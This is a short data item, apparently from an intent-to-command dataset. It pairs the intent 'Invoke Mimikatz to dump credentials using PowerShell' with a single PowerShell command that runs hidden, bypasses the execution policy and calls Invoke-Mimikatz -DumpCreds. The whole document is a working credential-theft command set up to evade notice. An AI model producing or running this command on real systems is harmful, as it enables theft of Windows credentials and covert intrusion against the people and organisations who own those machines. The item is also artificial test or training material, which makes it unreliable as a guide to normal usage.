# Natural language intent:
# Invoke Mimikatz to dump credentials using PowerShell

powershell.exe -NoP -W Hidden -Exec Bypass -Command "Invoke-Mimikatz -DumpCreds"
